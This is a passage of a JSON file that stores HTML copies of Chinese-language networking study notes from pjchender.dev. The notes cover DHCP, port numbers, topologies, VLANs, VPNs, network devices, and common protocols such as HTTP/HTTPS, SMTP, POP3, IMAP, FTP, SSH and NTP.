DHCP 功能，電腦需要配備 DHCP 用戶端，網路也必須設置 DHCP 伺服器。</p><blockquote><p>小型辦公室或家庭所使用的路由器大多有內建 DHCP 伺服器的功能，因此不需要另外添購。</p></blockquote><p>DHCP 適合在電腦尚未完成 IP 位址等網路設定前使用，一旦 IP 位址指定完成後，即無法透過 DHCP 來執行一般的通訊作業。</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/TUpOwrKc4ca.jpg?1\" alt=\"Imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"連接埠號port-number\">連接埠號（Port Number）<a href=\"#連接埠號port-number\" class=\"hash-link\" aria-label=\"連接埠號（Port Number）的直接連結\" title=\"連接埠號（Port Number）的直接連結\">​</a></h2><p>由於每台電腦僅會配置一個 IP 位址，當一台電腦能夠提供多個不同服務時，就須要透過連接埠號來加以區隔。連接埠號僅一個數字，介於 <code>0 ~ 65535</code>，其中的 0 ~ 1023 被稱為<strong>公認連接埠號（well-known port numbers）</strong>，通常針對重要度較高的應用程式配置。</p><p>常用的公認連接埠號包括：</p><table><thead><tr><th>連接埠號（Port Number）</th><th>通訊協定（Protocol）</th><th>主要用途</th></tr></thead><tbody><tr><td>80</td><td>HTTP</td><td>存取一般的網頁</td></tr><tr><td>443</td><td>HTTPS</td><td>存取加密過的網頁</td></tr><tr><td>110</td><td>POP3</td><td>讀取電子信箱</td></tr><tr><td>143</td><td>IMAP4</td><td>存取電子信箱</td></tr><tr><td>25</td><td>SMTP</td><td>在伺服器間進行郵件中繼轉送</td></tr><tr><td>587</td><td>SMTP submission</td><td>將郵件傳送到郵件伺服器</td></tr><tr><td>20</td><td>FTP data</td><td>檔案傳輸（轉送中繼資料）</td></tr><tr><td>21</td><td>FTP control</td><td>檔案傳輸（控制用）</td></tr></tbody></table><p>連接埠號歸屬於 TCP 或 UDP （傳輸層）所提供的功能：</p><p><strong>TCP 連接埠號</strong>：發送端（client）和接受端（server）的電腦都需要有連接埠號，一般來說網際網路的接收端會是使用連接埠 80 號，而發送端則會透過 TCP 自動配發一個公認連接埠號以外的數字（一般由作業系統指自動指派）。</p><p><strong>UDP 連接埠號</strong>：UDP 的通訊和 TCP 大致相似，但不需像 TCP 一樣需要先建立連線，並透過發送端的連接埠號來辨認連接類型。</p><blockquote><p>不同的連接埠號除了可用來辨別不同的服務外，當發送端（client）需要建立多個連線到相同接收端（server）的相同連接埠號時，不同的視窗亦會透過不同的連接埠號來發送請求；而接收端（server）在送回資料時，即可根據發送端的連接埠號，傳送資料到不同的視窗。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"了解網路拓樸topology\">了解網路拓樸（Topology）<a href=\"#了解網路拓樸topology\" class=\"hash-link\" aria-label=\"了解網路拓樸（Topology）的直接連結\" title=\"了解網路拓樸（Topology）的直接連結\">​</a></h2><blockquote><p>資料來源：<a href=\"https://notfalse.net/66/repeater-hub-bridge-switch\" target=\"_blank\" rel=\"noopener noreferrer\">中繼器 (Repeater)、集線器 (Hub)、橋接器 (Bridge)、交換器 (Switch) 原理與介紹</a> @ !false</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"匯流排拓樸-bus-topology\">匯流排拓樸 (Bus Topology)<a href=\"#匯流排拓樸-bus-topology\" class=\"hash-link\" aria-label=\"匯流排拓樸 (Bus Topology)的直接連結\" title=\"匯流排拓樸 (Bus Topology)的直接連結\">​</a></h3><p><img loading=\"lazy\" src=\"../../../i.imgur.com/tAMTKyb.png\" class=\"img_ev3q\"></p><p>將一同軸電纜佈於建築物內，並透過   收發器 (transceiver)  將多台主機連結至此主幹網路， 其簡單、便宜的特性，在當時很快就得到廣泛的使用。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"-星狀拓樸-star-topology\">  星狀拓樸 (star topology)<a href=\"#-星狀拓樸-star-topology\" class=\"hash-link\" aria-label=\"  星狀拓樸 (star topology)的直接連結\" title=\"  星狀拓樸 (star topology)的直接連結\">​</a></h3><p><img loading=\"lazy\" src=\"../../../i.imgur.com/x4MOHTrc81e.png?2\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"碰撞網域collision-domain\">碰撞網域（Collision Domain）<a href=\"#碰撞網域collision-domain\" class=\"hash-link\" aria-label=\"碰撞網域（Collision Domain）的直接連結\" title=\"碰撞網域（Collision Domain）的直接連結\">​</a></h3><p>當匯排上有兩個以上的節點同時發送封包時，會因為透過廣播（broadcast）進行傳輸的特性而發生碰撞，造成訊號擾亂的錯誤。</p><p>為了解決碰撞網域的問題，需要一種方式來協調彼此的溝通，確保不打斷對方談話、不壟斷發言權：</p><ul><li><strong>載波感測多重存取（CSMA）</strong>：先聽在講，主機在發送訊框前，先感測媒介是否正被使用 (有人在說話)， 若無，則立即傳送；否則，持續感測直到閒置 (idle) 後再傳送。</li><li><strong>碰撞偵測（CD）</strong>：持續感測媒介是否發生碰撞， 若偵測到碰撞，就中止傳輸並發送一 48 bit 的壅塞訊號，通知其他節點已發生碰撞， 最後，利用<a href=\"https://en.wikipedia.org/wiki/Exponential_backoff#Binary_exponential_backoff_Algorithm\" target=\"_blank\" rel=\"noopener noreferrer\">二元指數倒退演算法</a>等待一適當的時間進行重傳。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"無線區域網路\">無線區域網路<a href=\"#無線區域網路\" class=\"hash-link\" aria-label=\"無線區域網路的直接連結\" title=\"無線區域網路的直接連結\">​</a></h2><p>無線區域網路依通訊方式不同，可以分成多種不同規格：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/LcobtNc.jpg\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"虛擬網路virtual-lan\">虛擬網路（Virtual LAN）<a href=\"#虛擬網路virtual-lan\" class=\"hash-link\" aria-label=\"虛擬網路（Virtual LAN）的直接連結\" title=\"虛擬網路（Virtual LAN）的直接連結\">​</a></h2><p>將一個網路透過邏輯方式切割為數個網路的技術，就稱為<strong>虛擬網路（Virtual LAN, VLAN）</strong>，通常會同時搭配 Port based VLAN 和 Tag based VLAN 一起使用：</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"port-based-vlan\">Port based VLAN<a href=\"#port-based-vlan\" class=\"hash-link\" aria-label=\"Port based VLAN的直接連結\" title=\"Port based VLAN的直接連結\">​</a></h3><p>以連接埠為基礎的虛擬網路（Port based VLAN）即是將交換器或路由器的連接埠指定成多群組，以群組為單位獨立區域網路的技術，又稱為<strong>「區域網路切割」</strong>，有些交換器或路由器會內建此功能。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"tag-based-vlan\">Tag based VLAN<a href=\"#tag-based-vlan\" class=\"hash-link\" aria-label=\"Tag based VLAN的直接連結\" title=\"Tag based VLAN的直接連結\">​</a></h3><p>利用同一條區域網路線來傳送多個區域網路資料的技術，所使用的標準規範為 IEEE802.1Q，使用時必須將用來辨別 VLAN 編號的資料（標籤）嵌入到乙太網路訊框中，藉以區別資料是來自同一區域網路內的哪一個 VLAN。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"vpn-與-tunnel-技術\">VPN 與 Tunnel 技術<a href=\"#vpn-與-tunnel-技術\" class=\"hash-link\" aria-label=\"VPN 與 Tunnel 技術的直接連結\" title=\"VPN 與 Tunnel 技術的直接連結\">​</a></h2><p><strong>虛擬私有網路（VPN，Virtual Private Network）</strong>就是在既有的網路中，建立一個全新虛擬網路的技術，通常需要加密處理等機制，因此通訊速度較慢。</p><p>VPN 的重點在於<strong>穿隧技術（Tunnel）</strong>，也就是在某個通訊線路中所建立的「虛擬通訊線路」，其中使用了 PPTP（Point-to-Point Tunneling Protocol，點對點穿隧協定）、L2TP（Layer 2 Tunneling Protocol，第二層隧道協定），通時搭配 IPsec（Security Architecture for Internet Protocol，網際網路安全協定）的加密協定來為隧道的通訊作業加密。</p><p>在 IPsec 中又包含了幾種不同的協定，包含用來交換加密金鑰的 IKE Protocol（Internet Key Exchange）、處理加密後資料的 ESP Protocol（Encapsulated Security Payload）、認證標頭是否遭到竄改或偽裝的 AH Protocol（Authentication Header，鑑別標頭）。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資料來源\">資料來源<a href=\"#資料來源\" class=\"hash-link\" aria-label=\"資料來源的直接連結\" title=\"資料來源的直接連結\">​</a></h2><ul><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] TCP_IP 階層模型-常用網路設備 pjchender.dev": {
    "prefix": "hinternet [網際網路] TCP_IP 階層模型-常用網路設備 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] TCP_IP 階層模型-常用網路設備</h1></header><blockquote><p>此文章為各筆記之整理，非原創，擷取來源可見<a href=\"#%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90\">資料來源</a>。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"常用網路設備\">常用網路設備<a href=\"#常用網路設備\" class=\"hash-link\" aria-label=\"常用網路設備的直接連結\" title=\"常用網路設備的直接連結\">​</a></h2><blockquote><p>資料來源：<a href=\"https://notfalse.net/66/repeater-hub-bridge-switch\" target=\"_blank\" rel=\"noopener noreferrer\">中繼器 (Repeater)、集線器 (Hub)、橋接器 (Bridge)、交換器 (Switch) 原理與介紹</a> @ !false</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"中繼器repeater訊號增強\">中繼器（Repeater）：訊號增強<a href=\"#中繼器repeater訊號增強\" class=\"hash-link\" aria-label=\"中繼器（Repeater）：訊號增強的直接連結\" title=\"中繼器（Repeater）：訊號增強的直接連結\">​</a></h3><p>中繼器（Repeater）又稱為增益器或轉發器，是一實體層 (Physical layer) 設備，主要目的是在<strong>改善訊號衰減問題</strong>，使纜線總長度得以擴展。中繼器同樣也適用於電話通訊或無線網路，因此若 3G/4G 訊號較差，就可以安裝一台雙頻 ICS 中繼器或  Wi-Fi 延伸器。</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/gvgPN5Cc4ca.jpg?1\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"集線器-hub不同電腦間的封包傳遞\">集線器 (Hub)：不同電腦間的封包傳遞<a href=\"#集線器-hub不同電腦間的封包傳遞\" class=\"hash-link\" aria-label=\"集線器 (Hub)：不同電腦間的封包傳遞的直接連結\" title=\"集線器 (Hub)：不同電腦間的封包傳遞的直接連結\">​</a></h3><p>集線器是一中央節點（central node）的概念， 新增主機僅需將網路線插到連接埠（port）上，而移除主機也不過是把線移除，這使得網路擴展、設備維護都容易許多，此種佈線模式類似<!-- -->[星狀拓樸 (star topology)]<!-- -->。</p><p>集線器在接收封包（packet）進來後，會以廣播的方式將這個封包送到其它所有的電腦，不管誰才是應該收到該封包的電腦。集線器上的所有節點，仍皆位於同一碰撞網域（Collision Domain），此外，集線器屬於半雙工，收資料時並無法同時送資料，當因此當集線器連接非常多電腦時，網路就會變慢。</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/jPwPiSic4ca.png?1\" alt=\"Imgur\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"橋接器bridge連接乙太網路設備形成區域網路\">橋接器（Bridge）：連接乙太網路設備形成區域網路<a href=\"#橋接器bridge連接乙太網路設備形成區域網路\" class=\"hash-link\" aria-label=\"橋接器（Bridge）：連接乙太網路設備形成區域網路的直接連結\" title=\"橋接器（Bridge）：連接乙太網路設備形成區域網路的直接連結\">​</a></h3><p>主要用於連接多個不同網路區段（segment）的設備，成為「一個」大型乙太網路， 劃分區段的主要目的在於切開碰撞網域，進而減少碰撞機率，提升平均頻寬。</p><p>另外，橋接器可決定是否要讓資料訊框（Frame）通過橋接器到另一端網路上</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/xh795JK.png\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"交換器switch-連接乙太網路設備形成區域網路\">交換器（switch) ：連接乙太網路設備形成區域網路<a href=\"#交換器switch-連接乙太網路設備形成區域網路\" class=\"hash-link\" aria-label=\"交換器（switch) ：連接乙太網路設備形成區域網路的直接連結\" title=\"交換器（switch) ：連接乙太網路設備形成區域網路的直接連結\">​</a></h3><p><strong>交換器（Switch）</strong>一般指的是 <code>L2 交換器（資料連結層）</code>，<strong>它的作用是在區域網路中，將網路做連接的動作，也就是在連接埠之間轉送封包</strong>。交換器內有一張表，記錄著每一台電腦的 MAC 位址，當封包進來之後，Switch 會去檢查該封包的目的地的是哪一個 MAC 位址的電腦，只將這個封包送給該台電腦，其他電腦則不會收到封包。</p><p>交換器根據是否提供管理、監控、設置 (configure) 等功能，又分為：<strong>網管型交換器（managed switch）</strong>與<strong>非網管型交換器（unmanaged switch）</strong>。</p><blockquote><p>橋接器 (bridge)  與交換器 (switch)  時常被視為相等的。規範上的術語主要使用「橋接器」，實際上的裝置則多稱「交換器」。</p></blockquote><p><img loading=\"lazy\" src=\"../../../i.imgur.com/Mg6tfdm.jpg\" class=\"img_ev3q\"></p><p>小型交換器（非網管型）長得跟集線器（hub）很像， 但內部結構卻是完全不同，其所有連接埠都是獨立處理的，邏輯示意圖如下，<strong>目的是讓每個連接埠（port）都是獨立的碰撞網域</strong>：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/DiNOYNY.png\" class=\"img_ev3q\"></p><p>由於交換器中每個連接埠都是一個獨立碰撞網域，因此不再需要  <a href=\"https://notfalse.net/66/repeater-hub-bridge-switch#csma-cd\" target=\"_blank\" rel=\"noopener noreferrer\">CSMA/CD 機制</a> (因為不可能發生碰撞)， 每一台主機隨時都可以傳送/接收 (<a href=\"https://zh.wikipedia.org/wiki/雙工#%E5%85%A8%E9%9B%99%E5%B7%A5\" target=\"_blank\" rel=\"noopener noreferrer\">全雙工</a>)，因此大大地提高了平均頻寬！</p><p>交換器會根據訊框的目的位址查表後送往指定的連接埠，<strong>當訊框的內容有毀損或多餘時，予以忽略、丟棄，此功能稱為 —  過濾 (filtering)</strong>。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"路由器router將一個-ip-分享給多個電腦決定資料傳遞路徑\">路由器（Router）：將一個 IP 分享給多個電腦，決定資料傳遞路徑<a href=\"#路由器router將一個-ip-分享給多個電腦決定資料傳遞路徑\" class=\"hash-link\" aria-label=\"路由器（Router）：將一個 IP 分享給多個電腦，決定資料傳遞路徑的直接連結\" title=\"路由器（Router）：將一個 IP 分享給多個電腦，決定資料傳遞路徑的直接連結\">​</a></h3><p><strong>路由器是用來將網路的資訊，使用在電腦之間傳送的基本設備</strong>，路由器的工作在於 OSI 模式第三層（網路層），用來決定資料傳遞路徑的設備，有時又被稱為「L3 交換器」。</p><p>我們使用的 IP 協定就是藉由路由器將不同的 IP 位址連接在一起，網路上的資料分成一段一段的封包（packet），而<strong>這些封包要指向何處便是由路由器來決定的</strong>，路由器會根據資料的目的地，指示正確的方向，計算評估最便捷有效率的路徑來傳輸資料，也就是說<strong>路由器要為封包做最佳化的工作，找出最適當的路徑</strong>。</p><p>路由器的 IP 具有「<strong>轉送中繼</strong>」的功能，電腦 A 的 TCP 只要將傳送資料的責任交給 IP 後，IP 就會負責將資料送給電腦 Ｂ。</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/awMrAX1.jpg\" class=\"img_ev3q\"></p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/GVZRqJD.jpg\" class=\"img_ev3q\"></p><blockquote><ul><li>橋接器（Bridge）和路由器（Router）有一個不同點在於，橋接器只是單純做為一個決定是否讓封包通過的橋樑，Router 則會執行選徑功能。</li><li>許多路由器也會內建橋接器／交換器的功能。</li></ul></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"各設備功能之比較\">各設備功能之比較<a href=\"#各設備功能之比較\" class=\"hash-link\" aria-label=\"各設備功能之比較的直接連結\" title=\"各設備功能之比較的直接連結\">​</a></h3><p><img loading=\"lazy\" src=\"../../../i.imgur.com/i2KF8Zc.png\" class=\"img_ev3q\"></p><table><thead><tr><th></th><th>集線器（Hub）</th><th>橋接器（Bridge）</th><th>交換器（Switch）</th><th>路由器（Router）</th></tr></thead><tbody><tr><td>分割碰撞網域（Collision domain）</td><td>X</td><td>O</td><td>O</td><td>O</td></tr><tr><td>分割廣播網域（Broadcast domain）</td><td>X</td><td>X</td><td>X</td><td>O</td></tr><tr><td>OSI 模型分層</td><td>L1（實體層）</td><td>L2（資料鏈結層）</td><td>L2（資料鏈結層）</td><td>L3（網路層）</td></tr></tbody></table><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資料來源\">資料來源<a href=\"#資料來源\" class=\"hash-link\" aria-label=\"資料來源的直接連結\" title=\"資料來源的直接連結\">​</a></h2><ul><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li><li><a href=\"https://notfalse.net/66/repeater-hub-bridge-switch\" target=\"_blank\" rel=\"noopener noreferrer\">中繼器 (Repeater)、集線器 (Hub)、橋接器 (Bridge)、交換器 (Switch) 原理與介紹</a> @ !false</li><li><a href=\"http://bluemuta38.pixnet.net/blog/post/45543357\" target=\"_blank\" rel=\"noopener noreferrer\">集線器(Hub)、交換器(Switch)、IP 分享器、路由器(Router)的差別</a> @ Pixnet - Programs Knowledge</li><li><a href=\"http://giboss.pixnet.net/blog/post/26798642\" target=\"_blank\" rel=\"noopener noreferrer\">Hub(集線器)、Bridge(橋接器)、Switch(交換器)與 Router(路由器)</a> @ Pixnet - 小網管筆記</li><li><a href=\"http://fossbytes.com/networking-devices-and-hardware-types/\" target=\"_blank\" rel=\"noopener noreferrer\">Different Networking Devices And Hardware Types — Hub, Switch, Router, Modem, Bridge, Repeater</a> @ Fossbytes</li><li><a href=\"https://fossbytes.com/hub-vs-switch-comparison-and-difference/\" target=\"_blank\" rel=\"noopener noreferrer\">Hub vs Switch: Comparison And Difference Between Networking Devices</a> @ Fossbytes</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] 網路服務與技術 pjchender.dev": {
    "prefix": "hinternet [網際網路] 網路服務與技術 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] 網路服務與技術</h1></header><blockquote><p>此文章為各筆記之整理，非原創，擷取來源可見<a href=\"#%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90\">資料來源</a>：</p><ul><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li></ul></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"網頁瀏覽相關協定http-https-ssl-tsl\">網頁瀏覽相關協定（HTTP, HTTPS, SSL, TSL）<a href=\"#網頁瀏覽相關協定http-https-ssl-tsl\" class=\"hash-link\" aria-label=\"網頁瀏覽相關協定（HTTP, HTTPS, SSL, TSL）的直接連結\" title=\"網頁瀏覽相關協定（HTTP, HTTPS, SSL, TSL）的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"http\">HTTP<a href=\"#http\" class=\"hash-link\" aria-label=\"HTTP的直接連結\" title=\"HTTP的直接連結\">​</a></h3><p><strong>HTTP（Hypertext Transfer Protocol，超文本傳輸協定）</strong>是一種在網頁伺服器與網頁瀏覽器間，處理網頁資料的通訊協定。</p><p>它有一項特性是<strong>無狀態（Stateless）</strong>，也就是每個 request 都被視為是唯一且獨立的，它不會去記住之前的連線，所以只要發送同樣的 request 出去，就會一定會收到相同的 response。</p><p>HTTP 通常會搭配 TCP 使用，較少搭配 UDP，慣例上會以 Port 80 當作伺服器的連接埠號。</p><blockquote><p><a href=\"https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/\" target=\"_blank\" rel=\"noopener noreferrer\">A cartoon intro to DNS over HTTPS</a> @ Mozilla Hacks</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"http-proxyhttp-代理伺服器\">HTTP Proxy（HTTP 代理伺服器）<a href=\"#http-proxyhttp-代理伺服器\" class=\"hash-link\" aria-label=\"HTTP Proxy（HTTP 代理伺服器）的直接連結\" title=\"HTTP Proxy（HTTP 代理伺服器）的直接連結\">​</a></h3><p>一般來說，當我們透過 HTTP 對網路上的頁面發送請求時，電腦會直接和伺服器連線。但對於企業或團體來說，常會透過某個負責轉送的電腦，執行網際網路上的處理作業，這類的電腦可以在中間進行資料內容的轉送，一般稱為代理伺服器（Proxy）。</p><p>透過 HTTP Proxy 可以達到「<strong>內容快取（Content Cache）</strong>」的特性，減少網路連線壅塞的情況，並能「<strong>偵測病毒和防止駭客入侵</strong>」、「<strong>阻隔惡意網站</strong>」。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"httpsssl-和-tsl\">HTTPS、SSL 和 TSL<a href=\"#httpsssl-和-tsl\" class=\"hash-link\" aria-label=\"HTTPS、SSL 和 TSL的直接連結\" title=\"HTTPS、SSL 和 TSL的直接連結\">​</a></h3><p><strong>超文本傳輸安全協定（HTTPS）</strong> 是一種 HTTP 通訊的安全機制，預設的連接埠號是 443。透過 HTTPS，可以為 HTTP 請求和回應的內容<strong>加密</strong>，可以偵測通訊內容是否遭到<strong>竄改</strong>的情況，同時會<strong>驗證</strong>所要連線的網頁伺服器的真實身份。</p><p>身為加密連線，會以<strong>安全通訊端層（Secure Sockets Layer， SSL）</strong>及<strong>傳輸層安全性協定（Transport Layer Security， TLS）</strong>等加密方式來進行加密（屬於 OSI 模型的 Session Layer）：</p><ul><li>SSL 已不再更新，最高版本為 3.0。</li><li>TLS 其實就是 SSL 的升級版。</li><li>SSL 3.0 前已經是很過時的加密方式，且也曾被發現嚴重的漏洞，所以建議現在網站的加密方式都要是 TLS 起跳的才安全</li></ul><p>因為 TLS 是 SSL 下一代的版本，所以會有人把兩者相互對應：</p><ul><li>TLS 1.0 —&gt; SSL 3.1（0x0301）</li><li>TLS 1.1 —&gt; SSL 3.2（0x0302）</li><li>TLS 1.2 —&gt; SSL 3.3（0x0303）</li></ul><p>SSL/TLS 有多種機制（資料交換、金鑰加密方式）可以選擇，伺服器會在通訊一開始和用戶端相互溝通，選擇雙方都適合的機制，這樣過程就稱作「<strong>協商（Negotiation）</strong>」。</p><blockquote><ul><li>⭐ <a href=\"https://zhuanlan.zhihu.com/p/33043251\" target=\"_blank\" rel=\"noopener noreferrer\">HTTPS 的故事</a> @ 知乎</li><li><a href=\"https://ithelp.ithome.com.tw/articles/10194126\" target=\"_blank\" rel=\"noopener noreferrer\">Day7: 摸摸 HTTPS</a></li></ul></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"正向代理和反向代理\">正向代理和反向代理<a href=\"#正向代理和反向代理\" class=\"hash-link\" aria-label=\"正向代理和反向代理的直接連結\" title=\"正向代理和反向代理的直接連結\">​</a></h2><blockquote><ul><li><a href=\"https://medium.com/@oldmo860617/web-server-nginx-1-cf5188459108\" target=\"_blank\" rel=\"noopener noreferrer\">Web Server &amp; Nginx — (1)</a> @ 莫力全</li><li><a href=\"https://mp.weixin.qq.com/s/T7vd5heXXUjnbV-1wHg8xg\" target=\"_blank\" rel=\"noopener noreferrer\">漫話：如何給女朋友解釋什麼是反向代理？</a></li></ul></blockquote><p>代理（proxy）指的是透過中間的代理伺服器（proxy server）來達到一些目的：</p><ul><li><strong>正向代理（forward proxy）</strong>：server 在處理請求時，並不知道真正發送請求的 client 是誰，可以用來隱藏 client IP。</li><li><strong>反向代理（reverse proxy）</strong>：client 不知道發送請求後，實際處理請求的是哪個 server，常用在負載平衡（load balancing）上。</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"forward-proxy-和-vpn-的差異\">Forward Proxy 和 VPN 的差異<a href=\"#forward-proxy-和-vpn-的差異\" class=\"hash-link\" aria-label=\"Forward Proxy 和 VPN 的差異的直接連結\" title=\"Forward Proxy 和 VPN 的差異的直接連結\">​</a></h3><ul><li>Forward Proxy 和 VPN 都可以隱藏 client 的 IP 和身份，但兩者最大的差別主要在安全性，一般 client 和 Proxy Server 之間的資料傳遞並不會進行加密（除了基本的 https），不需先登入私人網路即可使用；相對的，client 在與 VPN 伺服器連線時則需要先有登入的機制，client 傳送到 VPN server 的訊息也都會先經過加密處理</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"電子郵件相關協定smtp-pop3-imap4\">電子郵件相關協定（SMTP, POP3, IMAP4）<a href=\"#電子郵件相關協定smtp-pop3-imap4\" class=\"hash-link\" aria-label=\"電子郵件相關協定（SMTP, POP3, IMAP4）的直接連結\" title=\"電子郵件相關協定（SMTP, POP3, IMAP4）的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"smtp傳遞電子郵件的通訊協定\">SMTP：傳遞電子郵件的通訊協定<a href=\"#smtp傳遞電子郵件的通訊協定\" class=\"hash-link\" aria-label=\"SMTP：傳遞電子郵件的通訊協定的直接連結\" title=\"SMTP：傳遞電子郵件的通訊協定的直接連結\">​</a></h3><p><strong>SMTP（Simple Mail Transfer Protocol，簡單郵件轉移協定）</strong>是一項用來傳遞電子郵件的通訊協定，通常搭配 TCP 使用，<strong>預設使用 Port 25</strong>。</p><p>由於 SMTP 不會將通訊內容加密，近幾年 SMTP 常透過 SSL/TLS 將內容加密，擴展成為 <strong>SMTPS</strong>。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"pop3-和-imap4讀取電子郵件的通訊協定\">POP3 和 IMAP4：讀取電子郵件的通訊協定<a href=\"#pop3-和-imap4讀取電子郵件的通訊協定\" class=\"hash-link\" aria-label=\"POP3 和 IMAP4：讀取電子郵件的通訊協定的直接連結\" title=\"POP3 和 IMAP4：讀取電子郵件的通訊協定的直接連結\">​</a></h3><p><strong>POP3（Post Office Protocol Version 3，電子郵件協定 3）</strong>和 <strong>IMAP4（Internet Message Access Protocol Version 4，網際網路訊息存取協定 4）</strong>都是用來將 Email 從 Email Box 中讀出的通訊協定。</p><p>POP3 的特色在於它能夠將 Email Box 中的 Email 讀入電腦中，因此能夠在電腦中進行整理或離線瀏覽，但下載郵件後會將伺服器裡的 Email 清空。通常會搭配 TCP 使用，並且<strong>預設使用 Port 110</strong>。若透過 SSL/TLS 提供的加密機制則稱為 <strong>POP3S</strong>，<strong>預設連接埠為 Port 995</strong>。</p><p>IMAP4 則是將郵件保存在伺服器的 Email Box 內，需要連線才能讀取郵件內容。通常會搭配 TCP 使用，<strong>預設為 Port 143</strong>，還可以透過 SSL/TLS 的加密機制成為 <strong>IMAP4S</strong>，<strong>預設連接埠為 Port 993</strong>。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"用來傳送檔案的通訊協定ftp\">用來傳送檔案的通訊協定（FTP）<a href=\"#用來傳送檔案的通訊協定ftp\" class=\"hash-link\" aria-label=\"用來傳送檔案的通訊協定（FTP）的直接連結\" title=\"用來傳送檔案的通訊協定（FTP）的直接連結\">​</a></h2><p>FTP（File Transfer Protocol）是一項用來傳送檔案的通訊協定，通常會搭配 TCP 使用，預設使用 <strong>Port 21 作為傳送控制，使用 Port 20 來傳送資料</strong>。</p><p>傳統上 FTP 不論登入或資料傳送都不採用加密機制，因此若有加密需求，可以使用 FTPS 或 SFTP。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"連線到伺服器或網路設備的機制ssh\">連線到伺服器或網路設備的機制（SSH）<a href=\"#連線到伺服器或網路設備的機制ssh\" class=\"hash-link\" aria-label=\"連線到伺服器或網路設備的機制（SSH）的直接連結\" title=\"連線到伺服器或網路設備的機制（SSH）的直接連結\">​</a></h2><p>SSH（遠端登入協定）是一項用來連接伺服器或網路設備，必且透過 CUI/GUI 來操控連線對象的通訊協定，同時也是該連線程式的名稱，必須搭配 TCP 使用，<strong>預設的連接埠為 Port 22</strong>。</p><p>SSH 的特色在於處理作業採用加密機制，因此安全性高，可避免資料被竊取而外洩的情形。</p><blockquote><p>相關內容可參考 [<!-- -->[IS]<!-- --> 關於 SSH.md](/Users/pjchen/Projects/Note/source/<!-- -->_<!-- -->posts/MIS-IS/<!-- -->[IS]<!-- --> 關於 SSH.md) 。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"校時系統ntp\">校時系統（NTP）<a href=\"#校時系統ntp\" class=\"hash-link\" aria-label=\"校時系統（NTP）的直接連結\" title=\"校時系統（NTP）的直接連結\">​</a></h2><p><strong>NTP（Network Time Protocol，網路時間通訊協定）</strong>是一種讓電腦只要連上網路就可以進行校時的協定，適用即時性較高的 UDP，預設使用連接埠 Port 123。</p><p>NTP 伺服器會透過 NTP 來提供 UTC（世界標準時間）的時間資訊，同時會預估好通訊所需花費的時間。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"虛擬化virtualization與雲端cloud\">虛擬化（Virtualization）與雲端（Cloud）<a href=\"#虛擬化virtualization與雲端cloud\" class=\"hash-link\" 